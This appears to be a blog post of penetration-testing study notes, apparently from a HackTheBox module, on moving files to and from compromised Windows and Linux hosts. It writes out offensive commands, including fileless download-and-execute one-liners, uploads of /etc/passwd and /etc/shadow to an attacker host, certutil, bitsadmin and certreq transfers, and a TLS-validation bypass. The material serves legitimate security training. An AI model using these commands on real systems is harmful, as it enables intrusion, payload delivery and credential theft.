---
title: "5 File Transfers"
description: "file transfer refers to the process of transmitting digital files between systems, often over a network or the internet."
pubDate: "May 09 2025"
heroImage: "/ftpp.jpg"
---

# Notes on Windows File Transfer Methods.

## Introduction
- Understanding Windows file transfer methods aids attackers in evading detection and defenders in monitoring and securing systems.
- **Example**: Microsoft Astaroth Attack, an advanced persistent threat (APT) using fileless techniques.
  - **Steps**:
    1. Spear-phishing email with URL to an archive containing an LNK file.
    2. LNK file triggers WMIC with "/Format" to download and execute malicious JavaScript.
    3. JavaScript uses Bitsadmin to download base64-encoded payloads.
    4. Certutil decodes payloads into DLLs; regsvr32 loads a DLL, injecting the final payload into the Userok process.
  - **Fileless Threats**: Run in memory to avoid detection, not stored as traditional files.

## File Transfer Methods

### PowerShell Base64 Encode & Decode
- **Purpose**: Transfer files without network communication by encoding to base64.
- **Process**:
  - Encode on source (e.g., Linux):
    ```bash
    cat id_rsa | base64 -w 0
    ```
  - Decode on Windows:
    ```powershell
    [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64_string>"))
    ```
  - Verify integrity with MD5:
    - Linux: `md5sum id_rsa`
    - Windows: `Get-FileHash -Path C:\Users\Public\id_rsa -Algorithm MD5`
- **Limitations**:
  - CMD string limit: 8,191 characters.
  - Web shells may fail with large strings.

### PowerShell Web Downloads
- **Context**: HTTP/HTTPS often allowed, enabling web-based transfers.
- **Methods**:
  - **System.Net.WebClient**:
    - `DownloadFile`:
      ```powershell
      (New-Object Net.WebClient).DownloadFile('https://<URL>', '<OutputPath>')
      ```
    - `DownloadString` (fileless):
      ```powershell
      IEX (New-Object Net.WebClient).DownloadString('https://<URL>')
      ```
  - **Invoke-WebRequest** (PowerShell 3.0+):
    - Slower, supports aliases (`iwr`, `wget`).
    - Example:
      ```powershell
      Invoke-WebRequest https://<URL> -OutFile <OutputPath>
      ```
- **Errors**:
  - **IE Configuration**: Bypass with `-UseBasicParsing`.
    ```powershell
    Invoke-WebRequest https://<URL> -UseBasicParsing | IEX
    ```
  - **SSL/TLS**: Bypass certificate validation.
    ```powershell
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    ```
- **Resources**: Harmjoy’s PowerShell download cradles for nuanced options.

### SMB Downloads
- **Protocol**: SMB on TCP/445, common in Windows networks.
- **Setup**:
  - Create SMB server (Pwnbox):
    ```bash
    sudo impacket-smbserver share -smb2support /tmp/smbshare
    ```
  - Copy file:
    ```cmd
    copy \\<IP>\share\nc.exe
    ```
- **Authentication**:
  - Newer Windows blocks guest access.
  - Use credentials:
    ```bash
    sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
    ```
    ```cmd
    net use n: \\<IP>\share /user:test test
    copy n:\nc.exe
    ```

### FTP Downloads
- **Protocol**: FTP on TCP/20, TCP/21.
- **Setup**:
  - Install/run FTP server:
    ```bash
    sudo pip3 install pyftpdlib
    sudo python3 -m pyftpdlib --port 21
    ```
  - Download with PowerShell:
    ```powershell
    (New-Object Net.WebClient).DownloadFile('ftp://<IP>/file.txt', 'C:\file.txt')
    ```
  - Non-interactive FTP:
    - Create `ftpcommand.txt`:
      ```cmd
      echo open <IP> > ftpcommand.txt
      echo USER anonymous >> ftpcommand.txt
      echo binary >> ftpcommand.txt
      echo GET file.txt >> ftpcommand.txt
      echo bye >> ftpcommand.txt
      ```
    - Execute:
      ```cmd
      ftp -v -n -s:ftpcommand.txt
      ```

### Upload Operations
- **Purpose**: Exfiltrate files for analysis or cracking.
- **Methods**:
  - **PowerShell Base64 Encode**:
    - Encode on Windows:
      ```powershell
      [Convert]::ToBase64String((Get-Content -Path "C:\Windows\system32\drivers\etc\hosts" -Raw -Encoding Byte))
      ```
    - Decode on Linux:
      ```bash
      echo <base64_string> | base64 -d > hosts
      md5sum hosts
      ```
  - **PowerShell Web Uploads**:
    - Use `uploadserver`:
      ```bash
      pip3 install uploadserver
      python3 -m uploadserver
      ```
    - Upload:
      ```powershell
      Invoke-FileUpload -Uri http://<IP>:8000/upload -File C:\Windows\System32\drivers\etc\hosts
      ```
    - Base64 with Netcat:
      ```powershell
      $b64 = [Convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Raw -Encoding Byte))
      Invoke-WebRequest -Uri http://<IP>:8000/ -Method POST -Body $b64
      ```
      ```bash
      nc -lvnp 8000
      echo <base64_string> | base64 -d > hosts
      ```
  - **FTP Upload**:
    - PowerShell:
      ```powershell
      (New-Object Net.WebClient).UploadFile('ftp://<IP>/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
      ```
    - Non-interactive:
      ```cmd
      echo open <IP> > ftpcommand.txt
      echo USER anonymous >> ftpcommand.txt
      echo binary >> ftpcommand.txt
      echo PUT C:\Windows\System32\drivers\etc\hosts >> ftpcommand.txt
      echo bye >> ftpcommand.txt
      ftp -v -n -s:ftpcommand.txt
      ```
  - **SMB Uploads**:
    - SMB over HTTP (WebDav):
      - Install WebDav:
        ```bash
        sudo pip3 install wsgidav cheroot
        sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
        ```
      - Connect/upload:
        ```cmd
        dir \\<IP>\DavWWWRoot
        copy C:\file.txt \\<IP>\DavWWWRoot
        ```
    - **Note**: Outbound SMB (TCP/445) often blocked, making WebDav a workaround.

# Notes on Linux File Transfer Methods

## Introduction
- Linux offers versatile tools for file transfers, benefiting both attackers (evading detection) and defenders (securing systems).
- **Example**: Incident response on web servers revealed threat actors exploiting SQL injection to deploy a Bash script. The script attempted malware downloads via:
  1. `cURL`
  2. `wget`
  3. Python (all using HTTP).
- **Common Protocols**: Malware often uses HTTP/HTTPS; Linux also supports FTP and SMB, but HTTP/HTTPS dominates.

## Download Operations
- Scenario: Transfer files from Pwnbox to a compromised Linux machine (NX04).

### Base64 Encoding/Decoding
- **Purpose**: Transfer files without network communication by encoding to base64.
- **Process**:
  - Check file integrity (Pwnbox):
    ```bash
    md5sum id_rsa
    # Output: 4e301756a07ded0a2dd6953abf015278 id_rsa
    ```
  - Encode to base64:
    ```bash
    cat id_rsa | base64 -w 0; echo
    # Output: LS0tLS1CRUdJTtBPUEVOU1NIIFBSSVZBVEUgS0VZLS0t...
    ```
  - Decode on target:
    ```bash
    echo -n '<base64_string>' | base64 -d > id_rsa
    ```
  - Verify integrity:
    ```bash
    md5sum id_rsa
    # Output: 4e301756a07ded0a2dd6953abf015278 id_rsa
    ```
- **Note**: Reverse operation (encode on target, decode on Pwnbox) supports uploads.

### Web Downloads with `wget` and `cURL`
- **Tools**: `wget` and `cURL`, common in Linux distributions.
- **Commands**:
  - `wget`:
    ```bash
    wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
    ```
  - `cURL`:
    ```bash
    curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
    ```
- **Difference**: `wget` uses `-O` (uppercase); `cURL` uses `-o` (lowercase) for output filename.

### Fileless Attacks
- **Concept**: Execute scripts without saving to disk using pipes.
- **Examples**:
  - `cURL`:
    ```bash
    curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
    ```
  - `wget` (Python script):
    ```bash
    wget -qO- https://raw.githubusercontent.com/guliourena/plaintext/master/hello.py | python
    # Output: hello World!
    ```
- **Note**: Some payloads (e.g., `mhillo`) may create temporary files despite fileless execution.

### Download with Bash (`/dev/tcp`)
- **Use Case**: When `wget` or `cURL` are unavailable, use Bash (version 2.04+ with `--enable-net-redirections`).
- **Process**:
  - Connect to web server:
    ```bash
    exec 3<>/dev/tcp/10.10.10.32/80
    ```
  - Send HTTP GET request:
    ```bash
    echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3
    ```
  - Read response:
    ```bash
    cat <&3
    ```

### SSH Downloads
- **Protocol**: SCP (secure copy) over SSH for secure file transfers.
- **Setup Pwnbox SSH Server**:
  - Enable:
    ```bash
    sudo systemctl enable ssh
    ```
  - Start:
    ```bash
    sudo systemctl start ssh
    ```
  - Verify:
    ```bash
    netstat -lnpt
    # Output: TCP 0.0.0.0:22 LISTEN
    ```
- **Download with SCP**:
  ```bash
  scp plaintext@192.168.49.128:/root/myroot.txt .
  ```
- **Note**: Use temporary accounts to avoid exposing primary credentials.

## Upload Operations
- **Purpose**: Exfiltrate files (e.g., for binary exploitation or packet analysis).
- **Methods**: Reuse download techniques for uploads.

### Web Upload
- **Tool**: `uploadserver` (Python module) with HTTPS support.
- **Setup**:
  - Install:
    ```bash
    sudo python3 -m pip install --user uploadserver
    ```
  - Create self-signed certificate:
    ```bash
    openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048
    ```
  - Start server:
    ```bash
    mkdir https && cd https
    sudo python3 -m uploadserver 443 --server-certificate /server.pem
    ```
- **Upload from target**:
  ```bash
  curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
  ```
- **Note**: `--insecure` used for self-signed certificate.

### Alternative Web File Transfer
- **Concept**: Use Python, PHP, or Ruby to host a web server on the target for file access.
- **Commands**:
  - Python3:
    ```bash
    python3 -m http.server
    # Serves on 0.0.0.0:8000
    ```
  - Python2.7:
    ```bash
    python2.7 -m SimpleHTTPServer
    ```
  - PHP:
    ```bash
    php -S 0.0.0.0:8000
    ```
  - Ruby:
    ```bash
    ruby -run -ehttpd . -p8000
    ```
- **Download from Pwnbox**:
  ```bash
  wget 192.168.49.128:8000/filetotransfer.txt
  ```
- **Note**: Inbound traffic may be blocked; this method downloads from target to Pwnbox, not uploads.

### SCP Upload
- **Use Case**: SSH (TCP/22) allowed for outbound connections.
- **Command**:
  ```bash
  scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
  ```
- **Note**: SCP syntax mirrors `cp`; requires SSH server on destination.


# Notes on Transferring Files with Code

## Introduction
- Common programming languages (Python, PHP, Perl, Ruby, JavaScript, VBScript) are often available on Linux and sometimes Windows, enabling file transfer operations.
- Windows supports JavaScript/VBScript via `cscript.exe` or `wscript.exe`.
- Approximately 700 programming languages exist, offering flexibility for file transfers and OS interactions.

## Download Operations

### Python
- **Versions**: Python 3 (current), Python 2.7 (legacy, still found on some servers).
- **Method**: Use `-c` for one-liners.
- **Examples**:
  - Python 2.7:
    ```bash
    python2.7 -c 'import urllib; urllib.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
    ```
  - Python 3:
    ```bash
    python3 -c 'import urllib.request; urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
    ```

### PHP
- **Prevalence**: Used by ~77.4% of websites with known server-side languages (W3Techs).
- **Methods**:
  - `file_get_contents` and `file_put_contents`:
    ```bash
    php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh", $file);'
    ```
  - `fopen`:
    ```bash
    php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while($buffer = fread($fremote, BUFFER)) fwrite($flocal, $buffer); fclose($fremote); fclose($flocal);'
    ```
  - Fileless (pipe to Bash):
    ```bash
    php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); echo implode("", $lines);' | bash
    ```
- **Note**: `@file` treats URLs as filenames if `fopen` wrappers are enabled.

### Ruby
- **Method**: Use `-e` for one-liners.
- **Example**:
  ```bash
  ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
  ```

### Perl
- **Method**: Use `-e` for one-liners.
- **Example**:
  ```bash
  perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
  ```

### JavaScript (Windows)
- **Method**: Use `cscript.exe` to run JavaScript for downloads.
- **Code** (`wget.js`):
  ```javascript
  var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
  WinHttpReq.Open("GET", WScript.Arguments(0), /*async*/false);
  WinHttpReq.Send();
  BinStream = new ActiveXObject("ADODB.Stream");
  BinStream.Type = 1;
  BinStream.Open();
  BinStream.Write(WinHttpReq.ResponseBody);
  BinStream.SaveToFile(WScript.Arguments(1));
  ```
- **Execution**:
  ```cmd
  cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 PowerView.ps1
  ```

### VBScript (Windows)
- **Context**: Default in Windows since Windows 98.
- **Code** (`wget.vbs`):
  ```vbscript
  dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
  dim bStrm: Set bStrm = createobject("Adodb.Stream")
  xHttp.Open "GET", WScript.Arguments.Item(0), False
  xHttp.Send
  with bStrm
      .type = 1
      .open
      .write xHttp.responseBody
      .savetofile WScript.Arguments.Item(1), 2
  end with
  ```
- **Execution**:
  ```cmd
  cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 PowerView.ps1
  ```

## Upload Operations

### Python 3
- **Tool**: `requests` module for HTTP POST requests.
- **Setup**: Start `uploadserver` on Pwnbox:
  ```bash
  python3 -m uploadserver
  # Serves on 0.0.0.0:8000
  ```
- **One-liner**:
  ```bash
  python3 -c 'import requests; requests.post("http://192.168.49.128:8000/upload", files={"files": open("/etc/passwd", "rb")})'
  ```
- **Expanded Code**:
  ```python
  import requests
  URL = "http://192.168.49.128:8000/upload"
  file = open("/etc/passwd", "rb")
  r = requests.post(URL, files={"files": file})
  ```
- **Note**: Adaptable to other languages by building similar upload logic.


# Notes on Miscellaneous File Transfer Methods

## Introduction
- Extends previous Windows/Linux file transfer methods and programming language approaches with additional techniques using Netcat, Ncat, PowerShell Remoting, and RDP.

## Netcat and Ncat

### Overview
- **Netcat (nc)**: Networking utility (1995, Hobbit) for TCP/UDP connections, unmaintained but widely used.
- **Ncat**: Modern Nmap Project reimplementation with SSL, IPv6, SOCKS/HTTP proxies, and connection brokering.
- **Note**: On HackTheBox Pwnbox, `nc`, `ncat`, and `netcat` all refer to Ncat.

### File Transfer with Netcat/Ncat
- **Scenario**: Transfer `SharpKatz.exe` from Pwnbox to a compromised machine.
- **Method 1: Compromised Machine Listens**
  - Compromised Machine (listen):
    - Netcat:
      ```bash
      nc -l -p 8000 > SharpKatz.exe
      ```
    - Ncat:
      ```bash
      ncat -l -p 8000 --recv-only > SharpKatz.exe
      ```
  - Pwnbox (send):
    - Netcat:
      ```bash
      nc -q 0 192.168.49.128 8000 < SharpKatz.exe
      ```
    - Ncat:
      ```bash
      ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
      ```
  - **Notes**:
    - `-q 0`: Closes connection after transfer (Netcat).
    - `--recv-only`/`--send-only`: Ensures connection closes post-transfer (Ncat).
- **Method 2: Pwnbox Listens (Bypasses Inbound Firewall)**
  - Pwnbox (listen):
    - Netcat:
      ```bash
      sudo nc -l -p 443 -q 0 < SharpKatz.exe
      ```
    - Ncat:
      ```bash
      sudo ncat -l -p 443 --send-only < SharpKatz.exe
      ```
  - Compromised Machine (connect):
    - Netcat:
      ```bash
      nc 192.168.49.128 443 > SharpKatz.exe
      ```
    - Ncat:
      ```bash
      ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
      ```
- **Method 3: Bash `/dev/tcp` (No Netcat/Ncat on Compromised Machine)**
  - Pwnbox (listen):
    - Netcat:
      ```bash
      sudo nc -l -p 443 -q 0 < SharpKatz.exe
      ```
    - Ncat:
      ```bash
      sudo ncat -l -p 443 --send-only < SharpKatz.exe
      ```
  - Compromised Machine (connect):
    ```bash
    cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
    ```
- **Note**: Reverse operation transfers files from compromised machine to Pwnbox.

## PowerShell Remoting (WinRM)
- **Context**: Used when HTTP/HTTPS/SMB are unavailable; leverages PowerShell Remoting (WinRM) for remote command execution and file transfers.
- **Requirements**: Administrative access, Remote Management Users group membership, or explicit permissions; enabled by default with HTTP (TCP/5985) and HTTPS (TCP/5986) listeners.
- **Scenario**: Transfer files between DC01 (source) and DATABASE01 (target) with administrative privileges.
- **Steps**:
  - Verify WinRM connectivity (from DC01):
    ```powershell
    whoami
    # Output: htb\administrator
    hostname
    # Output: DC01
    Test-NetConnection -ComputerName DATABASE01 -Port 5985
    # Output: TcpTestSucceeded: True
    ```
  - Create session:
    ```powershell
    $Session = New-PSSession -ComputerName DATABASE01
    ```
  - Transfer files:
    - DC01 to DATABASE01:
      ```powershell
      Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop
      ```
    - DATABASE01 to DC01:
      ```powershell
      Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -FromSession $Session -Destination C:\htb
      ```

## RDP (Remote Desktop Protocol)
- **Context**: Common in Windows for remote access; supports file transfers via copy-paste or drive mounting.
- **Methods**:
  - **Copy-Paste**:
    - Right-click to copy files from target Windows machine and paste into RDP session.
    - Linux clients (`xfreerdp`, `rdesktop`) support copy from target to session, but functionality may be inconsistent.
  - **Drive Mounting**:
    - Linux (mount local folder):
      - `rdesktop`:
        ```bash
        rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password00' -r disk:linux=/home/user
        ```
      - `xfreerdp`:
        ```bash
        xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password00' /drive:linux,/home/user
        ```
      - Access via `\\tsclient\linux` in RDP session.
    - Windows (native `mstsc.exe`):
      - Enable drive in Remote Desktop Connection settings (Local Resources > More > Drives).
      - Interact with drive in remote session.
    - **Note**: Mounted drive is exclusive to the RDP session user, preventing access by others, even if session is hijacked.

## Practical Applications
- **Use Cases**:
  - Active Directory Enumeration and Attacks (Skills Assessments 1 & 2).
  - Pivoting, Tunneling & Port Forwarding module.
  - Attacking Enterprise Networks module.
  - Shells & Payloads module.
- **Recommendation**: Practice all techniques to build "muscle memory" for varied environments with restrictions (e.g., blocked protocols).


# Notes on Living off the Land

## Introduction
- **Living off the Land (LotL)**: Coined by Christopher Campbell and Matt Graeber at DerbyCon 3, refers to using native system binaries for malicious purposes.
- **LOLBins**: Living off the Land Binaries, repurposed for unintended functions (term from Twitter discussions).
- **Resources**:
  - **LOLBAS**: Windows binaries (lolbas-project.github.io).
  - **GTFOBins**: Linux binaries (gtfobins.github.io).
- **Functions**: Download, upload, command execution, file read/write, and bypasses.
- **Focus**: Download/upload using LOLBAS and GTFOBins.

## Using LOLBAS and GTFOBins

### LOLBAS (Windows)
- **Search**: Use `/download` or `/upload` on lolbas-project.github.io.
- **Examples**:
  - **CertReq.exe** (Download):
  - **ConfigSecurityPolicy.exe** (Upload)
  - **DataSvcUtil.exe** (Upload)
- **Example: CertReq.exe Upload**:
  - Pwnbox (listen):
    ```bash
    sudo nc -lvnp 8000
    ```
  - Compromised Machine:
    ```cmd
    certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
    ```
  - **Output**: File content (e.g., `win.ini`) received in Netcat session.
  - **Note**: Older `certreq.exe` versions may lack `-Post`; download updated version if needed.

### GTFOBins (Linux)
- **Search**: Use `+file download` or `+file upload` on gtfobins.github.io.
- **Examples**:
  - Binaries: `ab`, `bash`, `curl`, `scp`, `socat`, `ssh`, `wget`.
  - Functions: File download/upload, SUID, sudo.
- **Example: OpenSSL Download**:
  - Pwnbox (create certificate and start server):
    ```bash
    openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
    openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem
    ```
  - Compromised Machine (download):
    ```bash
    openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
    ```

## Other Common LotL Tools

### Bitsadmin (Windows)
- **Purpose**: Background Intelligent Transfer Service (BITS) downloads files from HTTP/SMB, minimizing impact on user tasks.
- **Example**:
  ```powershell
  bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\htb\nc.exe
  ```
- **PowerShell BITS**:
  ```powershell
  Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\htb\nc.exe"
  ```
- **Features**: Supports credentials, proxy servers, uploads.

### Certutil (Windows)
- **Purpose**: Downloads arbitrary files, widely available but detected by Antimalware Scan Interface (AMSI) as malicious.
- **Example**:
  ```cmd
  certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
  ```

## Practice Recommendations
- Explore LOLBAS/GTFOBins for obscure binaries to build versatile file transfer skills.
- Useful for assessments where common methods are restricted.
- Document techniques for quick reference during engagements.
